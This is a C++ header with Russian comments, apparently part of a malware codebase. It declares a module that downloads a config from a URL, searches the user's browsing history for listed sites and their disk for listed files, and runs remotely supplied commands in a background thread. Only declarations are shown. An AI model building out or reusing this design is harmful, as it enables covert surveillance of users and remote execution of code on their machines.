//---------------------------------------------------------------------------
//
//   Модуль анализа истории посещения пользователем интернет ресурсов
//   и принятия решения на основе результата
//
//---------------------------------------------------------------------------

#ifndef HistoryAnalizerH
#define HistoryAnalizerH

//---------------------------------------------------------------------------
#include <windows.h>
#include "Strings.h"



typedef struct THistoryConfig
{
	PCHAR Command1;   // Основная команда. Выполнится если в истории
					  // будет найдено вхождение хотя-бы одного сайта из списка.
					  // В противном случае выполнится альтернативная команда
	PCHAR Command2;   // Альтернативная команда
	PStrings Sites;   // Список искомых сайтов
	PStrings Files;   // Список искомых на машине пользователя файлов
	bool ContainsURL; // Признак того, что один из сайтов найден в истории
} *PHistoryConfig;


namespace HisAnalizer
{
	//  Загрузить конфигурационный файл анализатора
	bool Download(PCHAR URL, PHistoryConfig &Config);

	//  Распарсить строки конфигурационного файла
	bool Parse(PCHAR Lines, PHistoryConfig Config);

	//  Произвести анализ истории и выполнить необходимую команду
	void Execute(PHistoryConfig Config);

	//  Загрузить и выполнить команду из конфигурационного файла
    void DownloadAndExecute(PCHAR URL);

	//  Очистить конфиг
	void ClearConfig(PHistoryConfig Config);

	// Уничтожить конфиг
    void FreeConfig(PHistoryConfig Config);

    // Запустить загрузку и выполнение анализатора истории в отдельном потоке
	void StartAnalizerThread(PCHAR URL);
}


//---------------------------------------------------------------------------
#endif
